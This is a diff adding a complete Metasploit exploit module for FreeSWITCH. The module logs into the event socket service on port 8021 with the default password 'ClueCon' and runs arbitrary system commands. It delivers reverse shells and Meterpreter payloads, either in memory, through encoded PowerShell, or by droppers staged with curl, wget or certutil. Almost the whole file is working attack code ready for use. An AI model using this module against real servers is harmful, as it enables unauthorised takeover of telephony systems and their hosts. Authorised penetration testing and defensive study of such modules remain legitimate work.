@@ -1,0 +1,169 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'FreeSWITCH Event Socket Command Execution',
+      'Description'     => %q{
+        This module uses the FreeSWITCH event socket interface
+        to execute system commands using the `system` API command.
+
+        The event socket service is enabled by default and listens
+        on TCP port 8021 on the local network interface.
+
+        This module has been tested successfully on FreeSWITCH versions:
+
+        1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine;
+        1.8.4~64bit on Ubuntu 19.04 (x64); and
+        1.10.1~64bit on Windows 7 SP1 (EN) (x64).
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          => ['bcoles'],
+      'References'      =>
+        [
+          ['CWE', '260'], # default password, configurable in event_socket.conf.xml
+          ['URL', 'https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket']
+        ],
+      'Platform'        => %w[win linux unix bsd],
+      'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],
+      'Payload'         => {'BadChars' => "\x00\x0a\x0d\x27\x5c"},
+      'CmdStagerFlavor' => %w[curl wget certutil vbs],
+      'Targets'         =>
+        [
+          ['Unix (In-Memory)',
+            'Platform'       => 'unix',
+            'Arch'           => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
+            'Type'           => :unix_memory
+          ],
+          ['Linux (Dropper)',
+            'Platform'       => 'linux',
+            'Arch'           => [ARCH_X86, ARCH_X64],
+            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},
+            'Type'           => :linux_dropper
+          ],
+          ['PowerShell (In-Memory)',
+            'Platform'       => 'win',
+            'Arch'           => [ARCH_X86, ARCH_X64],
+            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},
+            'Type'           => :psh_memory
+          ],
+          ['Windows (In-Memory)',
+            'Platform'       => 'win',
+            'Arch'           => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/reverse_powershell'},
+            'Type'           => :win_memory
+          ],
+          ['Windows (Dropper)',
+            'Platform'       => 'win',
+            'Arch'           => [ARCH_X86, ARCH_X64],
+            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},
+            'Type'           => :win_dropper
+          ]
+        ],
+      'Privileged'      => false,
+      'DefaultOptions'  => { 'RPORT' => 8021 },
+      'DisclosureDate'  => '2019-11-03',
+      'DefaultTarget'   => 0))
+    register_options [
+      OptString.new('PASSWORD', [true, 'FreeSWITCH event socket password', 'ClueCon'])
+    ]
+  end
+
+  def check
+    connect
+    banner = sock.get_once.to_s
+    disconnect
+
+    if banner.include?('Access Denied, go away.') || banner.include?('text/rude-rejection')
+      vprint_error 'Access denied by network ACL'
+      return CheckCode::Safe
+    end
+
+    unless banner.include?('Content-Type: auth/request')
+      return CheckCode::Safe
+    end
+
+    CheckCode::Appears
+  end
+
+  def auth(password)
+    sock.put "auth #{password}\n\n"
+    res = sock.get_once.to_s
+
+    unless res.include? 'Content-Type: command/reply'
+      fail_with Failure::UnexpectedReply, 'Unexpected reply'
+    end
+
+    unless res.include?('Reply-Text: +OK accepted')
+      fail_with Failure::NoAccess, 'Login failed'
+    end
+
+    print_status 'Login success'
+  end
+
+  def execute_command(cmd, opts = {})
+    api_function = opts[:foreground] ? 'system' : 'bg_system'
+
+    sock.put "api #{api_function} #{cmd}\n\n"
+    res = sock.get_once.to_s
+
+    unless res.include? 'Content-Type: api/response'
+      fail_with Failure::UnexpectedReply, 'Unexpected reply'
+    end
+
+    vprint_status "Response: #{res}"
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    connect
+    banner = sock.get_once.to_s
+
+    auth(datastore['PASSWORD'])
+
+    print_status "Sending payload (#{payload.encoded.length} bytes) ..."
+
+    case target['Type']
+    when :unix_memory
+      if datastore['PAYLOAD'] == 'cmd/unix/generic'
+        execute_command(payload.encoded, foreground: true)
+      else
+        execute_command(payload.encoded)
+      end
+    when :win_memory
+      if datastore['PAYLOAD'] == 'cmd/windows/generic'
+        execute_command(payload.encoded, foreground: true)
+      else
+        execute_command(payload.encoded)
+      end
+    when :psh_memory
+      execute_command(
+        cmd_psh_payload(
+          payload.encoded,
+          payload_instance.arch.first,
+          { :remove_comspec => true, :encode_final_payload => true }
+        )
+      )
+    when :linux_dropper
+      execute_cmdstager(:linemax => 1_500)
+    when :win_dropper
+      execute_cmdstager(:linemax => 1_500)
+    end
+  ensure
+    disconnect unless sock.nil?
+  end
+end
